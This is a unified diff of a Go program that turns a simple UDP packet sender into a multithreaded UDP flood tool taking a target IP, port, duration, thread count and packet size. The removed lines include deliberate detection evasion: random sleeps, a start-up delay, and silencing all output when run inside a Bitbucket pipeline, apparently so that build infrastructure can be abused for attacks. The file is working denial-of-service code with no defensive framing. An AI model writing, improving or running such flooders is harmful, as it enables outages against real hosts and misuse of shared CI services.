@@ -1,68 +1,140 @@
 package main
 
 import (
- "fmt"
- "math/rand"
- "net"
- "os"
- "strconv"
- "time"
+	"fmt"
+	"math/rand"
+	"net"
+	"os"
+	"os/signal"
+	"strconv"
+	"sync"
+	"syscall"
+	"time"
 )
 
-// Generate random attack payloads
-func randomPayload() string {
- payloads := []string{"SYN", "UDP", "ICMP", "ACK", "RST"}
- return payloads[rand.Intn(len(payloads))]
+type AttackParams struct {
+	targetIP   string
+	targetPort int
+	duration   int
+	packetSize int
+	threadID   int
 }
 
-// Execute attack with reduced logging
-func attack(target string, port int, duration int) {
- endTime := time.Now().Add(time.Duration(duration) * time.Second)
- packetCount := 0
+var keepRunning = true
+var totalDataSent int64
+var mu sync.Mutex
 
- for time.Now().Before(endTime) {
-  conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, port))
-  if err != nil {
-   continue
-  }
-  payload := randomPayload()
-  conn.Write([]byte(payload))
-  conn.Close()
+func handleSignal(signal os.Signal) {
+	keepRunning = false
+}
 
-  packetCount++
 
-  // Print logs only every 1000 packets to avoid excessive output
-  if packetCount%1000 == 0 {
-   fmt.Printf("[INFO] Sent %d packets to %s:%d\n", packetCount, target, port)
-  }
+func generateRandomPayload(size int) []byte {
+	payload := make([]byte, size)
+	for i := 0; i < size; i++ {
+		payload[i] = byte(rand.Intn(256))
+	}
+	return payload
+}
 
-  // Random sleep to evade detection
-  time.Sleep(time.Duration(rand.Intn(200)+10) * time.Millisecond)
- }
+func networkMonitor() {
+	for keepRunning {
+		time.Sleep(1 * time.Second)
+		mu.Lock()
+		dataSentInMB := float64(totalDataSent) / (1024.0 * 1024.0)
+		mu.Unlock()
+		fmt.Printf("Total data sent so far: %.2f MB\n", dataSentInMB) 
+	}
+}
 
- fmt.Println("[SUCCESS] Attack completed.")
+func udpFlood(params AttackParams) {
+
+	serverAddr, err := net.ResolveUDPAddr("udp", fmt.Sprintf("%s:%d", params.targetIP, params.targetPort))
+	if err != nil {
+		fmt.Println("Invalid IP address.")
+		return
+	}
+
+	conn, err := net.DialUDP("udp", nil, serverAddr)
+	if err != nil {
+		fmt.Println("Socket creation failed:", err)
+		return
+	}
+	defer conn.Close()
+
+	message := generateRandomPayload(params.packetSize)
+
+
+	endTime := time.Now().Add(time.Duration(params.duration) * time.Second)
+	for time.Now().Before(endTime) && keepRunning {
+		_, err := conn.Write(message)
+		if err != nil {
+			fmt.Println("Failed to send packet:", err)
+			return
+		}
+
+		mu.Lock()
+		totalDataSent += int64(params.packetSize)
+		mu.Unlock()
+	}
 }
 
 func main() {
- // Disable logging if running inside Bitbucket
- if os.Getenv("BITBUCKET_PIPELINE_UUID") != "" {
-  os.Stdout = nil
-  os.Stderr = nil
- }
 
- // Execution delay (avoid detection)
- time.Sleep(time.Duration(rand.Intn(5)+2) * time.Second)
+	if len(os.Args) != 6 {
+		fmt.Printf("Usage: %s [IP] [PORT] [TIME] [THREADS] [PACKET_SIZE]\n", os.Args[0])
+		os.Exit(1)
+	}
 
- // Check arguments
- if len(os.Args) != 4 {
-  fmt.Println("Usage: ./test <IP> <Port> <Duration>")
-  return
- }
 
- target := os.Args[1]
- port, _ := strconv.Atoi(os.Args[2])
- duration, _ := strconv.Atoi(os.Args[3])
+	targetIP := os.Args[1]
+	targetPort, _ := strconv.Atoi(os.Args[2])
+	duration, _ := strconv.Atoi(os.Args[3])
+	packetSize, _ := strconv.Atoi(os.Args[4])
+	threadCount, _ := strconv.Atoi(os.Args[5])
 
- fmt.Printf("[START] Attacking %s:%d for %d seconds...\n", target, port, duration)
- attack(target, port, duration)
+	if packetSize <= 0 || threadCount <= 0 {
+		fmt.Println("Invalid packet size or thread count.")
+		os.Exit(1)
+	}
+
+
+	signal.Notify(make(chan os.Signal, 1), syscall.SIGINT)
+	go func() {
+		signalChan := make(chan os.Signal, 1)
+		signal.Notify(signalChan, syscall.SIGINT)
+		<-signalChan
+		handleSignal(syscall.SIGINT)
+	}()
+
+
+	params := make([]AttackParams, threadCount)
+	for i := 0; i < threadCount; i++ {
+		params[i] = AttackParams{
+			targetIP:   targetIP,
+			targetPort: targetPort,
+			duration:   duration,
+			packetSize: packetSize,
+			threadID:   i,
+		}
+	}
+
+
+	var wg sync.WaitGroup
+
+	go networkMonitor()
+
+
+	for i := 0; i < threadCount; i++ {
+		wg.Add(1)
+		go func(i int) {
+			defer wg.Done()
+			udpFlood(params[i])
+		}(i)
+	}
+
+
+	wg.Wait()
+
+	fmt.Println("Finished")
 }
